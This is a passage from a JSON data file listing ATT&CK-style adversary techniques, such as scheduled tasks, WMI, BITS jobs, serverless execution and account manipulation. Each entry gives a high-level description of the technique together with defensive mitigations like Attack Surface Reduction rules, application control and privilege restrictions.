        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist.  "
            }
          ],
          [
            {
              "type": "text",
              "content": "Other types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. Risks of additional exploits and weaknesses in those systems may still exist. "
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1559",
    "name": "Inter-Process Communication",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [
      { "id": "T1559.001", "name": "Component Object Model" },
      { "id": "T1559.002", "name": "Dynamic Data Exchange" },
      { "id": "T1559.003", "name": "XPC Services" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes. Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Enable the Hardened Runtime capability when developing applications. Do not include the "
            },
            { "type": "code", "content": "com.apple.security.get-task-allow" },
            {
              "type": "text",
              "content": " entitlement with the value set to any variation of true. "
            }
          ]
        ]
      },
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure all COM alerts and Protected View are enabled."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution.  Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Modify Registry settings (directly or using Dcomcnfg.exe) in "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}"
            },
            {
              "type": "text",
              "content": " associated with the process-wide security of individual COM applications."
            }
          ],
          [
            {
              "type": "text",
              "content": "Modify Registry settings (directly or using Dcomcnfg.exe) in "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole"
            },
            {
              "type": "text",
              "content": " associated with system-wide security defaults for all COM applications that do no set their own process-wide security. "
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider disabling embedded files in Office programs, such as OneNote, that do not work with Protected View."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1106",
    "name": "Native API",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system."
        }
      ],
      [
        { "type": "text", "content": "Native API functions (such as " },
        { "type": "code", "content": "NtCreateProcess" },
        {
          "type": "text",
          "content": ") may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API "
        },
        { "type": "code", "content": "CreateProcess()" },
        { "type": "text", "content": " or GNU " },
        { "type": "code", "content": "fork()" },
        {
          "type": "text",
          "content": " will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations."
        }
      ],
      [
        {
          "type": "text",
          "content": "Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs. "
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Identify and block potentially malicious software executed that may be executed through this technique by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053",
    "name": "Scheduled Task/Job",
    "tactics": [
      { "id": "TA0002", "name": "Execution" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1053.002", "name": "At" },
      { "id": "T1053.003", "name": "Cron" },
      { "id": "T1053.005", "name": "Scheduled Task" },
      { "id": "T1053.006", "name": "Systemd Timers" },
      { "id": "T1053.007", "name": "Container Orchestration Job" }
    ],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. "
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at "
            },
            {
              "type": "code",
              "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl"
            },
            {
              "type": "text",
              "content": ". The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1648",
    "name": "Serverless Execution",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking). Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the "
        },
        { "type": "code", "content": "IAM:PassRole" },
        { "type": "text", "content": " permission in AWS or the " },
        { "type": "code", "content": "iam.serviceAccounts.actAs" },
        {
          "type": "text",
          "content": " permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot."
        }
      ],
      [
        {
          "type": "text",
          "content": "Serverless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created. Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Remove permissions to create, modify, or run serverless resources from users that do not explicitly require them."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1129",
    "name": "Shared Modules",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective."
        }
      ],
      [
        {
          "type": "text",
          "content": "The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in "
        },
        { "type": "code", "content": "dlfcn.h" },
        { "type": "text", "content": " in functions such as " },
        { "type": "code", "content": "dlopen" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "dlsym" },
        { "type": "text", "content": ". Although macOS can execute " },
        { "type": "code", "content": ".so" },
        { "type": "text", "content": " files, common practice uses " },
        { "type": "code", "content": ".dylib" },
        { "type": "text", "content": " files." }
      ],
      [
        {
          "type": "text",
          "content": "The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in "
        },
        { "type": "code", "content": "NTDLL.dll" },
        {
          "type": "text",
          "content": " and is part of the Windows Native API which is called from functions like "
        },
        { "type": "code", "content": "LoadLibrary" },
        { "type": "text", "content": " at run time." }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Identify and block potentially malicious software executed through this technique by using application control tools capable of preventing unknown modules from being loaded."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1072",
    "name": "Software Deployment Tools",
    "tactics": [
      { "id": "TA0002", "name": "Execution" },
      { "id": "TA0008", "name": "Lateral Movement" }
    ],
    "subs": [],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. Network infrastructure may also have administration tools that can be similarly abused by adversaries. "
        }
      ],
      [
        {
          "type": "text",
          "content": "The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper system and access isolation for critical network systems through use of group policy."
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "Limit Software Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict the use of third-party software suites installed within an enterprise network. "
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper system and access isolation for critical network systems through use of multi-factor authentication."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper system isolation for critical network systems through use of firewalls."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Grant access to application deployment systems only to a limited number of authorized administrators."
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "Remote Data Storage",
        "description": [
          [
            {
              "type": "text",
              "content": "If the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Patch deployment systems regularly to prevent potential remote access through Exploitation for Privilege Escalation."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that any accounts used by third-party providers to access these systems are traceable to the third-party and are not used throughout the network or used by other third-party providers in the same environment. Ensure there are regular reviews of accounts provisioned to these systems to verify continued business need, and ensure there is governance to trace de-provisioning of access that is no longer required. Ensure proper system and access isolation for critical network systems through use of account privilege separation."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Have a strict approval policy for use of deployment systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1569",
    "name": "System Services",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [
      { "id": "T1569.001", "name": "Launchctl" },
      { "id": "T1569.002", "name": "Service Execution" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by PsExec from running. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Prevent users from installing their own launch agents or launch daemons."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1204",
    "name": "User Execution",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [
      { "id": "T1204.001", "name": "Malicious Link" },
      { "id": "T1204.002", "name": "Malicious File" },
      { "id": "T1204.003", "name": "Malicious Image" }
    ],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing."
        }
      ],
      [
        {
          "type": "text",
          "content": "While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also deceive users into performing actions such as enabling Remote Access Software, allowing direct control of the system to the adversary, or downloading and executing malware for User Execution. For example, tech support scams can be facilitated through Phishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Software."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent executable files from running unless they meet a prevalence, age, or trusted list criteria and to prevent Office applications from creating potentially malicious executable content by blocking malicious code from being written to disk. Note: cloud-delivered protection must be enabled to use certain rules. "
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Application control may be able to prevent the running of executables masquerading as other files."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "If a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1047",
    "name": "Windows Management Instrumentation",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM). Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS."
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.  "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by WMI commands from running. Note: many legitimate tools and applications utilize WMI for command execution. "
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use application control configured to block execution of "
            },
            { "type": "code", "content": "wmic.exe" },
            {
              "type": "text",
              "content": " if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the "
            },
            { "type": "code", "content": "wmic.exe" },
            { "type": "text", "content": " application and to prevent abuse." }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Prevent credential overlap across systems of administrator and privileged accounts. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098",
    "name": "Account Manipulation",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1098.001", "name": "Additional Cloud Credentials" },
      { "id": "T1098.002", "name": "Additional Email Delegate Permissions" },
      { "id": "T1098.003", "name": "Additional Cloud Roles" },
      { "id": "T1098.004", "name": "SSH Authorized Keys" },
      { "id": "T1098.005", "name": "Device Registration" },
      { "id": "T1098.006", "name": "Additional Container Cluster Roles" }
    ],
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. "
        }
      ],
      [
        {
          "type": "text",
          "content": "In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication for user and privileged accounts."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Protect domain controllers by ensuring proper security configuration for critical servers to limit access by potentially unnecessary protocols and services, such as SMB file sharing."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that low-privileged user accounts do not have permissions to modify accounts or account-related policies."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1197",
    "name": "BITS Jobs",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations."
        }
      ],
      [
        {
          "type": "text",
          "content": "The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots)."
        }
      ],
      [
        {
          "type": "text",
          "content": "BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider reducing the default BITS job lifetime in Group Policy or by editing the "
            },
            { "type": "code", "content": "JobInactivityTimeout" },
            { "type": "text", "content": " and " },
            { "type": "code", "content": "MaxDownloadTime" },
            { "type": "text", "content": " Registry values in " },
            {
              "type": "code",
              "content": " HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider limiting access to the BITS interface to specific users or groups."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547",
    "name": "Boot or Logon Autostart Execution",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1547.001", "name": "Registry Run Keys / Startup Folder" },
      { "id": "T1547.002", "name": "Authentication Package" },
      { "id": "T1547.003", "name": "Time Providers" },
      { "id": "T1547.004", "name": "Winlogon Helper DLL" },
      { "id": "T1547.005", "name": "Security Support Provider" },
      { "id": "T1547.006", "name": "Kernel Modules and Extensions" },
      { "id": "T1547.007", "name": "Re-opened Applications" },
      { "id": "T1547.008", "name": "LSASS Driver" },
      { "id": "T1547.009", "name": "Shortcut Modification" },
      { "id": "T1547.010", "name": "Port Monitors" },
      { "id": "T1547.012", "name": "Print Processors" },
      { "id": "T1547.013", "name": "XDG Autostart Entries" },
      { "id": "T1547.014", "name": "Active Setup" },
      { "id": "T1547.015", "name": "Login Items" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel."
        }
      ],
      [
        {
          "type": "text",
          "content": "Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1037",
    "name": "Boot or Logon Initialization Scripts",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1037.001", "name": "Logon Script (Windows)" },
      { "id": "T1037.002", "name": "Login Hook" },
      { "id": "T1037.003", "name": "Network Logon Script" },
      { "id": "T1037.004", "name": "RC Scripts" },
      { "id": "T1037.005", "name": "Startup Items" }
    ],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. "
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict write access to logon scripts to specific administrators."
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1176",
    "name": "Browser Extensions",
    "tactics": [{ "id": "TA0003", "name": "Persistence" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access."
        }
      ],
      [
        {
          "type": "text",
          "content": "Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Previous to macOS 11, adversaries could silently install browser extensions via the command line using the "
        },
        { "type": "code", "content": "profiles" },
        { "type": "text", "content": " tool to install malicious " },
        { "type": "code", "content": ".mobileconfig" },
